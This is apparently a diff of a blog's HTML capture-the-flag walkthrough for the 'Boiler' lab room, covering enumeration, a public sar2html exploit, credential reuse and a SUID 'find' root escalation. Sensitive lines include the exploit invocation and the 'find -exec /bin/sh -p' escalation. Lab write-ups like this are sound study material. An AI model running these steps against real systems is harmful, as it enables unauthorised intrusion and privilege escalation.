@@ -22,31 +22,31 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org99eee1f">Intro</a></li>
-<li><a href="#org93c41aa">Recon</a>
+<li><a href="#org4480d5e">Intro</a></li>
+<li><a href="#org2c14413">Recon</a>
 <ul>
-<li><a href="#org9260d4d">Enumerating the ftp server</a></li>
-<li><a href="#orgbf8dc69">Analyzing the web server</a></li>
-<li><a href="#org5c4ebbf">Webmin</a></li>
-<li><a href="#org1005a93">Joomla Website</a></li>
+<li><a href="#org381223e">Enumerating the ftp server</a></li>
+<li><a href="#org07b9c62">Analyzing the web server</a></li>
+<li><a href="#orgece3f9e">Webmin</a></li>
+<li><a href="#orgd38b932">Joomla Website</a></li>
 </ul>
 </li>
-<li><a href="#org68d3428">Exploiting sar2html</a>
+<li><a href="#orga76a67c">Exploiting sar2html</a>
 <ul>
-<li><a href="#orga924836">Users</a></li>
+<li><a href="#org541e1d2">Users</a></li>
 </ul>
 </li>
-<li><a href="#org97d2bac">Basterd</a></li>
-<li><a href="#org8d520d0">Stoner</a></li>
-<li><a href="#org3f88938">Root</a></li>
-<li><a href="#org07a6327">Conclusion</a></li>
+<li><a href="#org5a14dc6">Basterd</a></li>
+<li><a href="#orgf82f7cf">Stoner</a></li>
+<li><a href="#org85c56a8">Root</a></li>
+<li><a href="#orgabcd42f">Conclusion</a></li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-org99eee1f" class="outline-2">
-<h2 id="org99eee1f"><a href="#org99eee1f">Intro</a></h2>
-<div class="outline-text-2" id="text-org99eee1f">
+<div id="outline-container-org4480d5e" class="outline-2">
+<h2 id="org4480d5e"><a href="#org4480d5e">Intro</a></h2>
+<div class="outline-text-2" id="text-org4480d5e">
 <p>
 After giving <code>attacktive directory</code> a try, and barely surviving, I went
 back to completing walkthrough rooms, striving to complete the Junior
@@ -61,14 +61,14 @@ has been really helpful!
 </div>
 </div>
 
-<div id="outline-container-org93c41aa" class="outline-2">
-<h2 id="org93c41aa"><a href="#org93c41aa">Recon</a></h2>
-<div class="outline-text-2" id="text-org93c41aa">
+<div id="outline-container-org2c14413" class="outline-2">
+<h2 id="org2c14413"><a href="#org2c14413">Recon</a></h2>
+<div class="outline-text-2" id="text-org2c14413">
 <p>
 The ordinary initial nmap scan gives us some basic starting info:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="orgd90d492"><span class="org-variable-name">IP</span>=boiler.thm
+<pre class="src src-bash" id="org38cd94c"><span class="org-variable-name">IP</span>=boiler.thm
 nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
 </pre>
 </div>
@@ -86,14 +86,14 @@ There are 3 open (tcp) ports, all of which are interesting:
 Before moving on, like always, I started a full scan as well, just to be safe:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org30ff382">nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
+<pre class="src src-bash" id="org8ec177c">nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
 </pre>
 </div>
 </div>
 
-<div id="outline-container-org9260d4d" class="outline-3">
-<h3 id="org9260d4d"><a href="#org9260d4d">Enumerating the ftp server</a></h3>
-<div class="outline-text-3" id="text-org9260d4d">
+<div id="outline-container-org381223e" class="outline-3">
+<h3 id="org381223e"><a href="#org381223e">Enumerating the ftp server</a></h3>
+<div class="outline-text-3" id="text-org381223e">
 <p>
 After logging in the ftp server as <code>anonymous</code>, I only had to run <code>ls -a</code>,
 (since plain <code>ls</code> did not list any files and <code>pwd</code> told me that I&rsquo;m in <code>/</code>),
@@ -101,7 +101,7 @@ to see a hidden file, which I then moved to my machine and checked
 out:
 </p>
 
-<pre class="example" id="org70be502">
+<pre class="example" id="org090c4cb">
 Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
 </pre>
 
@@ -111,7 +111,7 @@ figured it would not be very difficult to find (it seemed like a 1to1
 map). It was actually the first technique I tried: ROT13
 </p>
 
-<pre class="example" id="org284ad28">
+<pre class="example" id="orgda7789c">
 Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
 </pre>
 
@@ -122,16 +122,16 @@ version, I do not think that there is anything else here.
 </div>
 </div>
 
-<div id="outline-container-orgbf8dc69" class="outline-3">
-<h3 id="orgbf8dc69"><a href="#orgbf8dc69">Analyzing the web server</a></h3>
-<div class="outline-text-3" id="text-orgbf8dc69">
+<div id="outline-container-org07b9c62" class="outline-3">
+<h3 id="org07b9c62"><a href="#org07b9c62">Analyzing the web server</a></h3>
+<div class="outline-text-3" id="text-org07b9c62">
 <p>
 I am getting pretty comfortable checking webpages out, so I was
 disappointed seeing just the default Apache2 Homepage.
 </p>
 
 
-<div id="orgca59f88" class="figure">
+<div id="org924a807" class="figure">
 <p><img src="Recon/20231111_193556_screenshot.png" alt="20231111_193556_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 1: </span>Sad</p>
@@ -148,7 +148,7 @@ files/directories did not exist).
 <p>
 There was, a little bit encoded string following, that I had to check. 
 </p>
-<pre class="example" id="org1479360">
+<pre class="example" id="orgd941f37">
 079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
 </pre>
 <p>
@@ -157,7 +157,7 @@ Seeing that everything consisted of 3 digits, all of which lower than
 its ascii characters:
 </p>
 <div class="org-src-container">
-<pre class="src src-python" id="org8657fe0"><span class="org-keyword">def</span> <span class="org-function-name">convert_to_ascii</span>(input_string):
+<pre class="src src-python" id="org298b3ee"><span class="org-keyword">def</span> <span class="org-function-name">convert_to_ascii</span>(input_string):
     <span class="org-variable-name">integers</span> <span class="org-operator">=</span> input_string.split()
     <span class="org-variable-name">ascii_chars</span> <span class="org-operator">=</span> [<span class="org-builtin">chr</span>(<span class="org-builtin">int</span>(num)) <span class="org-keyword">for</span> num <span class="org-keyword">in</span> integers]
     <span class="org-keyword">return</span> <span class="org-string">''</span>.join(ascii_chars)
@@ -172,7 +172,7 @@ its ascii characters:
 The output was just barely more promising than what we started with,
 and hash-id does not give me reason to believe its a hash (of any kind)
 </p>
-<pre class="example" id="orgede5f39">
+<pre class="example" id="org7132748">
 OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK
 </pre>
 
@@ -184,7 +184,7 @@ OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK
 I, then, ran
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org2822b02">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://boiler.thm -o gobuster.big
+<pre class="src src-bash" id="orgad6ddd2">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://boiler.thm -o gobuster.big
 </pre>
 </div>
 <p>
@@ -192,7 +192,7 @@ giving me a couple of <i>new</i> directories <b>AND</b>, which is more an actual
 </p>
 
 
-<div id="org4d632aa" class="figure">
+<div id="orgf97db26" class="figure">
 <p><img src="Recon/20231111_195519_screenshot.png" alt="20231111_195519_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 2: </span>Now we talkin&rsquo;</p>
@@ -206,9 +206,9 @@ to connect to that port (55007), an ssh server also became available :P.
 </div>
 </div>
 
-<div id="outline-container-org5c4ebbf" class="outline-3">
-<h3 id="org5c4ebbf"><a href="#org5c4ebbf">Webmin</a></h3>
-<div class="outline-text-3" id="text-org5c4ebbf">
+<div id="outline-container-orgece3f9e" class="outline-3">
+<h3 id="orgece3f9e"><a href="#orgece3f9e">Webmin</a></h3>
+<div class="outline-text-3" id="text-orgece3f9e">
 <p>
 The question &ldquo;Can you exploit the service running on that port?&rdquo; got
 me thinking that I should most probably go there, before keep going
@@ -219,15 +219,15 @@ the answer there, sadly, was &ldquo;nay&rdquo;
 </div>
 </div>
 
-<div id="outline-container-org1005a93" class="outline-3">
-<h3 id="org1005a93"><a href="#org1005a93">Joomla Website</a></h3>
-<div class="outline-text-3" id="text-org1005a93">
+<div id="outline-container-orgd38b932" class="outline-3">
+<h3 id="orgd38b932"><a href="#orgd38b932">Joomla Website</a></h3>
+<div class="outline-text-3" id="text-orgd38b932">
 <p>
 Getting back to the website, I ran another gobuster instance, this
 time aimed at enumerating the <code>joomla</code> subdir:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org1bd7fd7">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://boiler.thm/joomla -o gobuster-joomla.big
+<pre class="src src-bash" id="org043deac">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://boiler.thm/joomla -o gobuster-joomla.big
 </pre>
 </div>
 
@@ -242,9 +242,9 @@ There were <b>a lot</b> of entries as well:
 </div>
 </div>
 
-<div id="outline-container-org68d3428" class="outline-2">
-<h2 id="org68d3428"><a href="#org68d3428">Exploiting sar2html</a></h2>
-<div class="outline-text-2" id="text-org68d3428">
+<div id="outline-container-orga76a67c" class="outline-2">
+<h2 id="orga76a67c"><a href="#orga76a67c">Exploiting sar2html</a></h2>
+<div class="outline-text-2" id="text-orga76a67c">
 <p>
 The path I found in the previous step seemed too good to be true, and
 after searching here and there a little bit I got accross this github repo:
@@ -253,7 +253,7 @@ exploiting sar2html
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org46c46e9">python3 sar2HTMLshell.py  -ip boiler.thm -pe /joomla/_test
+<pre class="src src-bash" id="org2416743">python3 sar2HTMLshell.py  -ip boiler.thm -pe /joomla/_test
 </pre>
 </div>
 
@@ -261,7 +261,7 @@ exploiting sar2html
 There, we had access as <code>www-data</code>, in a simple shell, also revealing a
 user and password, for us to use in the ssh server.
 </p>
-<pre class="example" id="orgcc96885">
+<pre class="example" id="orge083bc5">
 Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: REDACTED
 </pre>
 
@@ -272,9 +272,9 @@ reverse shell, which I then enhanced with python.
 </p>
 </div>
 
-<div id="outline-container-orga924836" class="outline-3">
-<h3 id="orga924836"><a href="#orga924836">Users</a></h3>
-<div class="outline-text-3" id="text-orga924836">
+<div id="outline-container-org541e1d2" class="outline-3">
+<h3 id="org541e1d2"><a href="#org541e1d2">Users</a></h3>
+<div class="outline-text-3" id="text-org541e1d2">
 <p>
 There are 3 actual users:
 </p>
@@ -288,16 +288,16 @@ There are 3 actual users:
 </div>
 </div>
 
-<div id="outline-container-org97d2bac" class="outline-2">
-<h2 id="org97d2bac"><a href="#org97d2bac">Basterd</a></h2>
-<div class="outline-text-2" id="text-org97d2bac">
+<div id="outline-container-org5a14dc6" class="outline-2">
+<h2 id="org5a14dc6"><a href="#org5a14dc6">Basterd</a></h2>
+<div class="outline-text-2" id="text-org5a14dc6">
 <p>
 Yeah, I did not enumerate much I suppose, but seeing that it was a
 limited user, I thought there was no point in losing more time there.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org108f55e">ssh basterd@boiler.thm -p55007
+<pre class="src src-bash" id="org82cc438">ssh basterd@boiler.thm -p55007
 </pre>
 </div>
 
@@ -308,16 +308,16 @@ cronjob running from a user <code>backup</code> that I had seen in <code>/etc/pa
 before), contained <code>stoner</code>&rsquo;s password. Not bad
 </p>
 
-<pre class="example" id="orgd41e43e">
+<pre class="example" id="orga5c8647">
 USER=stoner
 #REDACTED
 </pre>
 </div>
 </div>
 
-<div id="outline-container-org8d520d0" class="outline-2">
-<h2 id="org8d520d0"><a href="#org8d520d0">Stoner</a></h2>
-<div class="outline-text-2" id="text-org8d520d0">
+<div id="outline-container-orgf82f7cf" class="outline-2">
+<h2 id="orgf82f7cf"><a href="#orgf82f7cf">Stoner</a></h2>
+<div class="outline-text-2" id="text-orgf82f7cf">
 <p>
 Now, this seems to be something we can work with :P.
 </p>
@@ -325,7 +325,7 @@ Now, this seems to be something we can work with :P.
 <p>
 user.txt exists hidden in our home folder, and&#x2026;
 </p>
-<pre class="example" id="org77367d0">
+<pre class="example" id="orga32f03b">
 stoner@Vulnerable:/home$ sudo -l
 User stoner may run the following commands on Vulnerable:
     (root) NOPASSWD: /NotThisTime/MessinWithYa
@@ -339,7 +339,7 @@ Lucky me, the same command I ran to get some more info on the system
 seems to be my way out:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org10670e5">find / -perm /4000 2&gt;/dev/null
+<pre class="src src-bash" id="orgfe51683">find / -perm /4000 2&gt;/dev/null
 </pre>
 </div>
 <p>
@@ -347,23 +347,23 @@ revealed that I can execute it as root, so:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org28ebd14">find . -exec /bin/sh -p <span class="org-string">\;</span> -quit
+<pre class="src src-bash" id="orgd8c60e6">find . -exec /bin/sh -p <span class="org-string">\;</span> -quit
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org3f88938" class="outline-2">
-<h2 id="org3f88938"><a href="#org3f88938">Root</a></h2>
-<div class="outline-text-2" id="text-org3f88938">
+<div id="outline-container-org85c56a8" class="outline-2">
+<h2 id="org85c56a8"><a href="#org85c56a8">Root</a></h2>
+<div class="outline-text-2" id="text-org85c56a8">
 <p>
 The flag can be found in <code>/root</code>
 </p>
 </div>
 </div>
 
-<div id="outline-container-org07a6327" class="outline-2">
-<h2 id="org07a6327"><a href="#org07a6327">Conclusion</a></h2>
-<div class="outline-text-2" id="text-org07a6327">
+<div id="outline-container-orgabcd42f" class="outline-2">
+<h2 id="orgabcd42f"><a href="#orgabcd42f">Conclusion</a></h2>
+<div class="outline-text-2" id="text-orgabcd42f">
 <p>
 This room was really nice. I agree with the author, it was not that
 difficult, it just took some time to follow the threads. That&rsquo;s it for today.
